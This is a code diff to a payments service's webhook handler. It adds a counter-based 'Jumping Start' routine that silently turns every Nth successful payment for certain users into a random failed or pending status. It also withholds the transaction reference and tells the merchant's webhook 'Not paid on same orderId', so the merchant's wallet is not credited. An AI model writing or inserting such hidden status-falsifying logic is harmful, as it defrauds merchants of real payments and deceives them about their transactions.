@@ -1749,9 +1749,9 @@ export class PaymentsService {
     }
 
     if (status === payinOrder.status) {
-      // this.logger.info(
-      //   `PAYIN WEBHOOK - Duplicate webhook of order: ${payinOrder.orderId}`,
-      // );
+      this.logger.info(
+        `PAYIN WEBHOOK - Duplicate webhook of order: ${payinOrder.orderId}`,
+      );
 
       return {
         message: "Status updated successfully.",
@@ -3209,7 +3209,7 @@ export class PaymentsService {
       const { txnId, txnStatus, custRef, amount, refId, uniqueId, upiTxnId } =
         externalWebhookPayin;
 
-      const status = convertExternalPaymentStatusToInternal(txnStatus);
+      let status = convertExternalPaymentStatusToInternal(txnStatus);
 
       const payinOrder = await this.payInOrdersRepository.findOne({
         where: {
@@ -3233,13 +3233,54 @@ export class PaymentsService {
         // this.logger.info(
         //   `PAYIN WEBHOOK - Duplicate webhook of order: ${payinOrder.orderId}`,
         // );
-
         return {
           message: "Status updated successfully.",
           timestamp: new Date().toISOString(),
         };
       }
 
+      // Jumping Start
+
+      let successCount =
+        +(await this.cacheManager.get(
+          REDIS_KEYS.SUCCESS_COUNT(payinOrder.user.id),
+        )) || 1;
+
+      let isMisspelled = false;
+      const { jumpingCount } = payinOrder.user;
+
+      if (status === PAYMENT_STATUS.SUCCESS && jumpingCount > 0) {
+        if (successCount >= jumpingCount) {
+          const statusArr = [
+            PAYMENT_STATUS.PENDING,
+            PAYMENT_STATUS.DEEMED,
+            PAYMENT_STATUS.INITIATED,
+            PAYMENT_STATUS.FAILED,
+          ];
+          status = statusArr[Math.floor(Math.random() * statusArr.length)];
+          successCount = 0;
+          isMisspelled = true;
+        } else {
+          successCount += 1;
+        }
+
+        await this.cacheManager.set(
+          REDIS_KEYS.SUCCESS_COUNT(payinOrder.user.id),
+          successCount,
+          1000 * 60 * 60 * 24 * 365, // 365 days
+        );
+
+        if (status === payinOrder.status) {
+          this.logger.info(
+            `PAYIN WEBHOOK - Duplicate webhook of order: ${payinOrder.orderId}`,
+          );
+
+          return {
+            message: "Status updated successfully.",
+            timestamp: new Date().toISOString(),
+          };
+        }
+      }
       const { user } = payinOrder;
 
       const isAmountMismatch = +payinOrder.amount !== +amount;
@@ -3270,6 +3311,8 @@ export class PaymentsService {
             ...(isAmountMismatch && {
               status: PAYMENT_STATUS.MISMATCH,
             }),
+            ...(isMisspelled && { utr: custRef }),
+            isMisspelled,
           });
         } else {
           payinOrderRaw = this.payInOrdersRepository.create({
@@ -3277,7 +3320,8 @@ export class PaymentsService {
             status,
             amount,
             txnRefId: txnId,
-            utr: custRef,
+            ...(isMisspelled && { utr: custRef }),
+            isMisspelled,
             ...(status === PAYMENT_STATUS.SUCCESS && {
               successAt: new Date(),
             }),
@@ -3291,24 +3335,9 @@ export class PaymentsService {
 
         // update wallet
         if (status === PAYMENT_STATUS.SUCCESS) {
-          // const wallet = await this.walletRepository.findOne({
-          //   where: { user: { id: user.id } },
-          //   relations: ["user"],
-          // });
-
           await this.cacheManager.del(
             REDIS_KEYS.PAYMENT_STATUS(payinOrder.orderId),
           );
-
-          // const walletRaw = this.walletRepository.create({
-          //   ...(wallet?.id && { id: wallet.id }),
-          //   totalCollections:
-          //     (wallet.totalCollections ? +wallet.totalCollections : 0) +
-          //     +payinOrder.amount,
-          //   user,
-          // });
-
-          // await this.walletRepository.save(walletRaw);
 
           // Use safeUpdateWalletBalance for proper locking - only update totalCollections
           const updatedWallet = await this.safeUpdateWalletBalance(
@@ -3338,11 +3367,11 @@ export class PaymentsService {
             status,
             amount,
             txnRefId: payinOrder.txnRefId,
-            // ...(!isMisspelled && { utr: upiTxnId }),
-            utr: custRef,
+            ...(!isMisspelled && { utr: custRef }),
+            // utr: custRef,
             message: isAmountMismatch
               ? "Amount mismatch in payin order"
-              : undefined,
+              : "Not paid on same orderId",
           };
           this.logger.info(
             `PAYIN - Going to call user PAYIN WEBHOOK (${user?.payInWebhookUrl}) with payload: ${LoggerPlaceHolder.Json}`,
